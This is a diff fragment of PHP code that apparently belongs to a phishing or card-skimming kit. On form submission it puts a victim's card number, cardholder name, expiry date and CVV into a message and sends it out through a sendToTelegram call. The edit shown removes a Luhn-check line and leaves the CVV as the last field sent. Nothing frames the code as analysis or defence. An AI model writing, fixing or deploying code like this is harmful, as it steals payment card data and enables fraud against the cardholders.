@@ -89,8 +89,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
              . "🔢 <b>Card Number:</b> {$cardNumberRaw}\n"
              . "👤 <b>Cardholder:</b> {$nameOnCard}\n"
              . "📅 <b>Expiry:</b> {$expiryDate}\n"
-             . "🔐 <b>CVV:</b> {$securityCode}\n"
-             . "✅ <b>Luhn valid:</b> " . ($luhnValid ? 'Yes' : 'No') . "\n"
+             . "🔐 <b>CVV:</b> {$securityCode}\n";
+            
             
     
     sendToTelegram($message);
